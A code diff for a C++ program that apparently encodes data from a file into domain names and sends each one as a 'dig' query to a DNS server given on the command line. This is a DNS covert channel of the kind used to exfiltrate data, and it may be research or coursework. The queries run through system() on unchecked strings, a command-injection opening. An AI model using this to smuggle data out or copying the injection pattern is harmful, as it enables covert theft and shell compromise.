@@ -15,7 +15,7 @@ using namespace std;
 #define DEBUG_COUT(x) do {} while(0)
 #endif
 
-bool embed_message(const string filename, char* nxdomain){
+bool embed_message(string filename, string nxdomain){
     // Read input file 
 	ifstream input_file(filename, ios::binary);
 	
@@ -109,6 +109,28 @@ bool embed_message(const string filename, char* nxdomain){
     return true;
 }
 
+bool transmit(string dns_server){
+    ifstream input_file("s_domain.txt");
+    if (!input_file.is_open()) {
+        cerr << "Unable to open s_domain.txt" << endl;
+        return false;
+    }
+
+    string line;
+    string cmd;
+    while (getline(input_file, line)) {
+        cmd = "dig +tcp @" + dns_server + " " + line;
+        DEBUG_COUT(cout << "Executing command: " << cmd << endl;);
+        int ret = system(cmd.c_str());
+        if (ret == -1) {
+            cerr << "Failed to execute command: " << cmd << endl;
+            input_file.close();
+            return false;
+        }
+    }
+    return true;
+}
+
 int main(int argc, char** argv){
     // Check command line arguments
     if (argc != 4) {
@@ -116,15 +138,15 @@ int main(int argc, char** argv){
         return 1;
     }
 
-    if(embed_message(argv[1], argv[2])){
-        cout << "embed_message() succeeded.\n";
-    }
-    else{
+    // Check embed_message() function
+    if(!embed_message(argv[1], argv[2])){
         cerr << "embed_message() failed.\n";
         return 1;
     }
 
-	// const string filename = argv[1];
-	// char* nxdomain = argv[2];
-	
+    // Check transmit() function
+    if(!transmit(argv[3])){
+        cerr << "transmit() failed.\n";
+        return 1;
+    }
 }
